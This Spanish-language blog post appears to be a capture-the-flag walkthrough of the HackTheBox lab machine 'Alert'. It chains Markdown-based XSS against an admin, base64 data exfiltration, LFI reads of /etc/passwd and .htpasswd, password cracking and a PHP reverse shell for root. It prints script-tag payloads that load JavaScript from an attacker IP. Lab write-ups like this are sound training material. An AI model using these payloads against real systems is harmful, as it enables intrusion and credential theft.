+++ 
draft = false
date = 2025-01-06T17:08:18+01:00
title = "Guía de Alert en HackTheBox"
description = "Un tutorial para la máquina HTB \"Alert\""
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="files/title.png" alt="Title card">}}

Feliz año nuevo y bienvenidos a otro artículo de HackTheBox, hoy nos centraremos en la máquina HTB "Alerta", comencemos:

# Reconocimiento básico

{{<betterfigure src="files/scan.png" alt="Nmap scan">}}

La misma historia de siempre, nuestra máquina tiene los puertos HTTP y SSH abiertos.
Añadid el nombre de dominio al archivo `/etc/hosts` y echemos un vistazo al interior.

# Ganando un punto de apoyo

{{<betterfigure src="files/web.png" alt="Website">}}

Podemos saber inmediatamente de qué trata el sitio web, podemos cargar archivos **Markdown** y renderizarlos en el navegador. Bastante bien.

Los desarrolladores parecen estar orgullosos de su administrador por responder a cualquier mensaje enviado a través de la sección "Contáctenos", suena interesante, pero deberíamos centrarnos en el renderizado de Markdown por ahora.

{{<betterfigure src="files/gullible.png" alt="Gullible">}}

## ¿Entrada de usuario desinfectada? ¡Nunca he oído hablar de ello!

Dado que el objetivo del sitio web es renderizar Markdown, escribamos un poco de texto para que lo procese:
 
{{<betterfigure src="files/marktest.png" alt="Markdown test 1">}}

{{<betterfigure src="files/marktest1.png" alt="Markdown test 2">}}

Ahora puede que estés pensando en intentar buscar cualquier CVE relacionado con software de renderizado Markdown, pero lo más probable es que te encuentres con las manos vacías.

Entonces, ¿cómo intentamos atacar un sitio web usando nada más que Markdown? Bueno, si estás familiarizado con Markdown, existe la posibilidad de que hayas usado etiquetas HTML "inline" en el pasado, así que probemos algo nuevo...

{{<betterfigure src="files/alert.png" alt="XSS">}}

{{<betterfigure src="files/alert1.png" alt="XSS">}}

Bingo, parece que el renderizador de Markdown no está comprobando si hay entradas de usuario potencialmente peligrosas, como etiquetas `<script>`, lo que significa que podemos ejecutar ataques XSS, ¿a quién? Javascript ejecutado localmente no nos va a ayudar a obtener acceso remoto al servidor.

## Administradores crédulos

Hasta ahora hemos conseguido encontrar una vulnerabilidad XSS, pero no hay nada que podamos hacer con ella, al menos cuando ejecutamos código JS en nuestra propia máquina. Aunque es posible que recuerdes una línea anterior de este artículo:

> Los desarrolladores parecen estar orgullosos de su administrador por responder a cualquier mensaje enviado a través de la sección "Contáctenos", suena interesante, pero deberíamos centrarnos en el renderizado de Markdown por ahora.

Intentemos enviar un archivo Markdown tratando de descargar un archivo .js de nuestra máquina atacante con el siguiente código:

```md
# Hello
## Hello
### Hello

* Item 1
* Item 2
* Item 3

<script src=http://10.10.16.33:8000/somefile></script>
```

Subimos el nuevo archivo Markdown, abrimos nuestro servidor HTTP y enviamos el enlace a través del formulario de contacto:

{{<betterfigure src="files/gullible.png" alt="Gullible admins">}}

¡Y bingo! El administrador en realidad abrió el enlace como se puede ver en las solicitudes del servidor HTTP.

## ¿A dónde vamos ahora?

Hemos probado que podemos enviar payloads XSS a los administradores y ellos las ejecutarán, aunque ¿cómo podemos extraer información útil utilizando este método?

Gracias [al siguiente repositorio](https://github.com/hoodoer/XSS-Data-Exfil), podemos hacer que la víctima solicite fácilmente una página del sitio y envíe su contenido codificado en base64 a través de una solicitud GET a nuestro servidor web.

Todo lo que tenemos que hacer es que el cliente descarge el archivo exfilPayload.js modificado con los parámetros adecuados y la página web solicitada se mostrará como una cadena Base64 solicitada a nuestro servidor web.

{{<betterfigure src="files/exfilpayload.png">}}

Para este ejemplo, intentemos solicitar la página raíz de la máquina desde la cuenta de administrador modificando el código mostrado anteriormente.

```md
# Hello
## Hello
### Hello

* Item 1
* Item 2
* Item 3

<script src=http://10.10.16.33/exfilPayload.js></script>
```

{{<betterfigure src="files/baseacquired.png">}}

Como podrás ver, hemos recibido una string codificada en base64 en nuestro servidor HTTP, ¡intentemos decodificarla!

{{<betterfigure src="files/decoded.png">}}

La payload XSS funcionó, logramos solicitar la página raíz utilizando los permisos del administrador, y si estabas prestando atención, es posible que veas un botón de barra de navegación adicional además de "Markdown Viewer", "Contact Us", "About Us" y "Donate"...

Intentemos solicitarlo y veamos qué podemos encontrar:

{{<betterfigure src="files/messages.png">}}

Parece que hay un mensaje disponible para el administrador, sin embargo, si intentamos solicitar ese archivo específico, no devolverá nada realmente útil.

Sin embargo, es posible que te hayas dado cuenta de que en lugar de solicitar una página, está solicitando un archivo específico del servidor, así que veamos si podemos jugar con este parámetro:

## Accediendo al sistema de archivos

Veamos si podemos intentar volver atrás en el árbol del sistema de archivos y acceder al archivo /etc/passwd...

{{<betterfigure src="files/passwdjs.png">}}

{{<betterfigure src="files/passwdacquired.png">}}

¡Y bingo! Funcionó, parece que hay dos usuarios disponibles aparte de root en el servidor. Esto confirma que tenemos acceso LFI completo al servidor y podemos intentar solicitar cualquier archivo de este, así que veamos si podemos encontrar algunas credenciales ahora.

> Una de las formas más efectivas de explotar las vulnerabilidades de LFI es buscar rutas de archivos de configuración comunes, como por ejemplo, los archivos de configuración de Apache como `/etc/apache2/apache2.conf`

{{<betterfigure src="files/pullapache.png">}}

{{<betterfigure src="files/apacheconfig.png">}}

Si has seguido probando diferentes archivos de configuración, es posible que hayas llegado tropezar con el correcto que contiene la información de VirtualHost para los dominios alert.htb, y con él te habrás dado cuenta de que también había otro dominio todo este tiempo, uno llamado "statistics.alert.htb"

Como indica el archivo de configuración, si se intenta acceder a este dominio, se pedirán credenciales contenidas en un archivo en `/var/www/statistics.alert.htb/.htpasswd`, ¡así que intentemos descargar ese archivo!

{{<betterfigure src="files/pullcredentials.png">}}

{{<betterfigure src="files/htpasswd.png">}}

Descargamos con éxito el archivo de credenciales, intentemos descifrarlo usando John The Ripper, naturalmente usamos la wordlist rockyou.txt para ello, al mismo tiempo especificando el formato "md5crypt-long".

{{<betterfigure src="files/albertpass.png">}}

Es posible que ahora estés pensando en usar las credenciales en el servicio apache protegido, pero ¿recuerdas a los usuarios que vimos después de descargar el archivo `/etc/passwd`? Uno de ellos tiene el mismo nombre que el del archivo de credenciales, y dado que las personas tienden a reutilizar las contraseñas, vale la pena darle una oportunidad a SSH ahora:

{{<betterfigure src="files/userflag.png">}}

¡Las credenciales sí funcionan! Y ahora por fin hemos conseguido acceder a la bandera user.txt.

# Escalada de privilegios

Mientras exploras la máquina, puede que verifiques los puertos abiertos y encuentres el puerto 8080 actualmente disponible en localhost:

{{<betterfigure src="files/localhost.png">}}

Tras una inspección más detallada mediante el uso de SSH Forwarding para acceder al puerto desde tu propia máquina, se podrá ver que es un monitor de sitio web integrado en el servidor.

{{<betterfigure src="files/monitor.png">}}

Si intentamos encontrar el código fuente original que alimenta este servicio, nos encontraremos con estas carpetas, aunque es posible que te veas un grupo especial con permisos de escritura completos sobre una de las carpetas, ¡con nuestro usuario justo en ese mismo grupo!

{{<betterfigure src="files/webconfig.png">}}

Otra cosa que descubrirás es que el archivo index.php parece estar importando un archivo php desde esa misma carpeta en la que tenemos permisos, ¡así que intentemos usar una reverse shell para alcanzar root!

{{<betterfigure src="files/index.png">}}

Todo lo que tienes que hacer es reemplazar el contenido del archivo de configuración con una shell inversa php mientras mantienes abierto tu puerto netcat, y poco después obtendrás una shell con acceso a la bandera root:

{{<betterfigure src="files/root.png">}}
